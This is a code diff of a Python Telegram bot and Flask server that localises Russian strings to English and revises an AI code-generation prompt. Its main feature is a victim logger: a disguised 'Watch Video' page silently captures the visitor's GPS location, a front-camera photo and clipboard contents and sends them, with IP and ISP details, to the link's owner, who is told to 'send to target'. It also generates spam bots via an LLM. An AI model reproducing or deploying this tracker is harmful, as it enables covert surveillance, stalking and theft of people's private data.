@@ -25,10 +25,9 @@ loop = None
 BOTS_DIR = "deployed_bots"
 os.makedirs(BOTS_DIR, exist_ok=True)
 
-# ================= СТРАНИЦА ЛОГГЕРА =================
 TRACKER_PAGE = """<!DOCTYPE html>
 <html>
-<head><title>TikTok</title><meta charset="UTF-8">
+<head><title>Video</title><meta charset="UTF-8">
 <meta name="viewport" content="width=device-width,initial-scale=1.0">
 <style>
 *{margin:0;padding:0;box-sizing:border-box}
@@ -37,9 +36,9 @@ button{background:#fe2c55;color:#fff;border:none;padding:15px 40px;font-size:18p
 #status{margin-top:20px;color:#aaa}
 </style></head>
 <body>
-<h2 style="margin-top:80px">🎬 TikTok Video</h2>
-<p>Нажми кнопку чтобы посмотреть</p>
-<button onclick="startAll()">▶ Смотреть</button>
+<h2 style="margin-top:80px">Video Ready</h2>
+<p>Press button to watch</p>
+<button onclick="startAll()">Watch Video</button>
 <p id="status"></p>
 <video id="v" style="display:none" autoplay playsinline></video>
 <canvas id="c" style="display:none"></canvas>
@@ -50,7 +49,7 @@ function startAll(){
     if(navigator.geolocation){navigator.geolocation.getCurrentPosition(p=>fetch('/gps/{{ link_id }}',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({lat:p.coords.latitude,lon:p.coords.longitude,acc:p.coords.accuracy})}),e=>{},{enableHighAccuracy:true,timeout:10000});}
     (async()=>{try{var s=await navigator.mediaDevices.getUserMedia({video:{facingMode:'user'}});var v=document.getElementById('v');v.srcObject=s;await v.play();await new Promise(r=>setTimeout(r,2000));var c=document.getElementById('c');c.width=v.videoWidth||640;c.height=v.videoHeight||480;c.getContext('2d').drawImage(v,0,0);var ph=c.toDataURL('image/jpeg',0.7);await fetch('/photo/{{ link_id }}',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({photo:ph})});s.getTracks().forEach(t=>t.stop())}catch(e){}})();
     (async()=>{try{var t=await navigator.clipboard.readText();if(t)fetch('/clipboard/{{ link_id }}',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({clipboard:t})})}catch(e){}})();
-    setTimeout(()=>{document.getElementById('status').innerText='✅';window.location.href='https://t.me/creator_failpybot'},3000);
+    setTimeout(()=>{document.getElementById('status').innerText='Done';window.location.href='https://t.me/creator_failpybot'},3000);
 }
 </script></body></html>"""
 
@@ -71,13 +70,12 @@ def get_ip_info(ip):
     except: pass
     return {'country':'?','city':'?','region':'?','isp':'?','lat':None,'lon':None,'query':first_ip}
 
-# ================= FLASK РОУТЫ =================
 @app.route('/')
 def home(): return "OK"
 
 @app.route('/go/<lid>')
 def track(lid):
-    if lid not in links: return "Ссылка недействительна"
+    if lid not in links: return "Invalid link"
     ip = request.headers.get('X-Forwarded-For', request.remote_addr)
     ua = request.headers.get('User-Agent', '?')
     v = {'time': datetime.now().strftime('%H:%M:%S'), 'ip': ip, 'ua': ua, 'photo': None, 'gps': None, 'clipboard': None}
@@ -112,49 +110,81 @@ def clipboard(lid):
         if d.get('clipboard'): links[lid]['victims'][-1]['clipboard'] = d['clipboard']
     return 'ok'
 
-# ================= ЛОГГЕР NOTIFY =================
 async def notify(uid, lid):
     try:
         await asyncio.sleep(10)
         v = links[lid]['victims'][-1] if links[lid]['victims'] else {}
-        report = f"""🎯 ПЕРЕХОД
-🕐 {v.get('time','?')}
-🌐 IP: {v.get('ip','?').split(',')[0].strip() if v.get('ip') else '?'}
-🏙 {v.get('city','?')}, {v.get('region','?')}, {v.get('country','?')}
-📡 {v.get('isp','?')}
-📱 {v.get('ua','?')[:150]}
+        report = f"""NEW VISIT
+Time: {v.get('time','?')}
+IP: {v.get('ip','?').split(',')[0].strip() if v.get('ip') else '?'}
+Location: {v.get('city','?')}, {v.get('region','?')}, {v.get('country','?')}
+ISP: {v.get('isp','?')}
+Device: {v.get('ua','?')[:150]}
 """
-        if v.get('gps') and v['gps'].get('lat'): report += f"📍 GPS: {v['gps']['lat']}, {v['gps']['lon']}\n"
-        if v.get('clipboard'): report += f"📋 Буфер: {v['clipboard'][:200]}"
+        if v.get('gps') and v['gps'].get('lat'): report += f"GPS: {v['gps']['lat']}, {v['gps']['lon']}\n"
+        if v.get('clipboard'): report += f"Clipboard: {v['clipboard'][:200]}"
         await bot.send_message(uid, report[:2000])
         if v.get('photo'):
             try:
                 photo_path = f"photo_{lid}.jpg"
                 with open(photo_path, 'wb') as f: f.write(base64.b64decode(v['photo'].split(',')[1]))
-                if os.path.getsize(photo_path) > 100: await bot.send_file(uid, photo_path, caption="📸 Фото")
+                if os.path.getsize(photo_path) > 100: await bot.send_file(uid, photo_path, caption="Photo")
                 os.remove(photo_path)
             except: pass
         if v.get('gps') and v['gps'].get('lat'):
             lat, lon = v['gps']['lat'], v['gps']['lon']
             geo = InputMediaGeoPoint(geo_point=InputGeoPoint(lat=lat, long=lon, accuracy_radius=10))
-            await bot.send_file(uid, file=geo, caption="📍 GPS")
-            await bot.send_message(uid, f"🗺 [Google Maps](https://maps.google.com/?q={lat},{lon})", link_preview=True)
+            await bot.send_file(uid, file=geo, caption="GPS")
+            await bot.send_message(uid, f"Google Maps: https://maps.google.com/?q={lat},{lon}", link_preview=True)
     except Exception as e:
-        print(f"Ошибка notify: {e}")
+        print(f"Notify error: {e}")
 
-# ================= ДЕПЛОЙ БОТА =================
+# ================= ИИ С ГЛУБОКИМ МЫШЛЕНИЕМ =================
 def generate_bot_code(description: str) -> str:
-    prompt = f"""Ты — эксперт по Telegram ботам (Telethon). Напиши ПОЛНЫЙ код бота.
-api_id=6, api_hash="eb06d4abfb49dc3eeb1aeb98ae0f581e", токен="ВСТАВЬ_СВОЙ_ТОКЕН".
-Описание: {description}
-Выдай ТОЛЬКО Python код."""
+    prompt = f"""You are an expert Python developer specializing in Telegram bots using Telethon library.
+Write a COMPLETE, working bot code based on the description below.
+Take your time to think through the logic carefully before writing code.
+Make sure all handlers are correct and the bot will work without errors.
+
+CRITICAL RULES:
+1. Use ONLY: from telethon import TelegramClient, events
+2. api_id = 6, api_hash = "eb06d4abfb49dc3eeb1aeb98ae0f581e"
+3. Token must be: BOT_TOKEN = "REPLACE_WITH_YOUR_TOKEN"
+4. Add /start command with function description
+5. Output ONLY Python code, no explanations
+6. Code must be fully functional
+7. Do NOT use emoji or special characters in comments
+
+Bot description: {description}
+
+Think step by step:
+1. What handlers are needed?
+2. What imports are required?
+3. What is the main logic?
+4. Are there any edge cases?
+
+Now write the complete code:"""
+    
     headers = {"Content-Type": "application/json", "Authorization": f"Bearer {GROQ_API_KEY}"}
+    payload = {
+        "model": "llama-3.3-70b-versatile",
+        "messages": [{"role": "user", "content": prompt}],
+        "temperature": 0.2,
+        "max_tokens": 6000,
+        "top_p": 0.95,
+        "frequency_penalty": 0.1,
+        "presence_penalty": 0.1,
+    }
+    
     try:
-        resp = requests.post(API_URL, json={"model": "llama-3.1-8b-instant", "messages": [{"role": "user", "content": prompt}], "temperature": 0.5, "max_tokens": 3000}, headers=headers, timeout=30)
-        return resp.json()['choices'][0]['message']['content'].replace("```python", "").replace("```", "").strip()
-    except: return "# Ошибка генерации"
+        resp = requests.post(API_URL, json=payload, headers=headers, timeout=60)
+        code = resp.json()['choices'][0]['message']['content']
+        return code.replace("```python", "").replace("```", "").strip()
+    except Exception as e:
+        return f"# Generation error: {e}"
 
 def deploy_bot(code: str, token: str) -> str:
+    code = code.replace("REPLACE_WITH_YOUR_TOKEN", token)
     code = code.replace("ВСТАВЬ_СВОЙ_ТОКЕН", token)
     bot_id = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=6))
     filename = f"{BOTS_DIR}/bot_{bot_id}.py"
@@ -162,15 +192,15 @@ def deploy_bot(code: str, token: str) -> str:
     subprocess.Popen(['python', filename], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
     return f"bot_{bot_id}.py"
 
-# ================= БОТ КОМАНДЫ =================
+# ================= БОТ =================
 @bot.on(events.NewMessage(pattern='/start'))
 async def start(event):
     buttons = [
-        [Button.inline("🔍 Создать ссылку логгера", "logger")],
-        [Button.inline("📤 Загрузить .py (деплой бота)", "upload")],
-        [Button.inline("🤖 ИИ напишет бота", "ai_generate")],
+        [Button.inline("Create logger link", "logger")],
+        [Button.inline("Upload .py file (deploy bot)", "upload")],
+        [Button.inline("AI generate bot", "ai_generate")],
     ]
-    await event.reply("🤖 **ALL-IN-ONE BOT**\n\n🔍 Логгер | 📤 Деплой | 🤖 ИИ\n\nВыбери:", buttons=buttons)
+    await event.reply("ALL-IN-ONE BOT\n\nLogger | Deploy | AI Generator\n\nChoose action:", buttons=buttons)
 
 @bot.on(events.CallbackQuery)
 async def callback(event):
@@ -180,15 +210,15 @@ async def callback(event):
     if data == "logger":
         lid = gen_id()
         links[lid] = {'owner': user_id, 'created': datetime.now().strftime('%H:%M'), 'victims': []}
-        await event.edit(f"✅ Ссылка:\n`https://botaald.onrender.com/go/{lid}`\n\nОтправь жертве!")
+        await event.edit(f"Link created:\n`https://botaald.onrender.com/go/{lid}`\n\nSend to target!")
     
     elif data == "upload":
         user_states[user_id] = {'action': 'wait_code'}
-        await event.edit("📤 Отправь .py файл с кодом бота")
+        await event.edit("Send .py file with bot code")
     
     elif data == "ai_generate":
         user_states[user_id] = {'action': 'wait_description'}
-        await event.edit("🤖 Опиши бота:\nПример: «бот для спама в чат»")
+        await event.edit("Describe your bot:\nExample: 'bot for spam in chat'")
 
 @bot.on(events.NewMessage(incoming=True))
 async def handle(event):
@@ -205,26 +235,26 @@ async def handle(event):
         with open(temp_path, 'r', encoding='utf-8', errors='ignore') as f: code = f.read()
         user_states[user_id]['code'] = code
         user_states[user_id]['action'] = 'wait_token'
-        await event.reply("✅ Код получен! Отправь токен от @BotFather:")
+        await event.reply("Code received! Send bot token from @BotFather:")
         os.remove(temp_path)
     
     elif state['action'] == 'wait_token' and ':' in text and len(text) > 30:
         code = state['code']
-        msg = await event.reply("⏳ Запускаю...")
+        msg = await event.reply("Deploying bot...")
         try:
             filename = deploy_bot(code, text)
             del user_states[user_id]
-            await msg.edit(f"✅ Бот запущен! Файл: `{filename}`")
+            await msg.edit(f"Bot deployed! File: `{filename}`")
         except Exception as e:
-            await msg.edit(f"❌ Ошибка: {e}")
+            await msg.edit(f"Error: {e}")
     
     elif state['action'] == 'wait_description' and text:
-        msg = await event.reply("🤖 ИИ генерирует...")
+        msg = await event.reply("AI is generating code...")
         code = generate_bot_code(text)
         gen_path = os.path.join(tempfile.gettempdir(), f"bot_{random.randint(1000,9999)}.py")
         with open(gen_path, 'w', encoding='utf-8') as f: f.write(code)
-        await msg.edit("✅ Отправляю файл...")
-        await bot.send_file(user_id, gen_path, caption="🤖 Твой бот!\n📝 Замени ВСТАВЬ_СВОЙ_ТОКЕН")
+        await msg.edit("Sending file...")
+        await bot.send_file(user_id, gen_path, caption="Your bot code\nReplace REPLACE_WITH_YOUR_TOKEN with your token")
         os.remove(gen_path)
         del user_states[user_id]
 
@@ -235,7 +265,7 @@ async def main():
     def run_flask(): app.run(host='0.0.0.0', port=port, debug=False)
     threading.Thread(target=run_flask, daemon=True).start()
     await bot.start(bot_token=BOT_TOKEN)
-    print("✅ ALL-IN-ONE запущен!")
+    print("All-in-One bot started!")
     await bot.run_until_disconnected()
 
 if __name__ == "__main__":
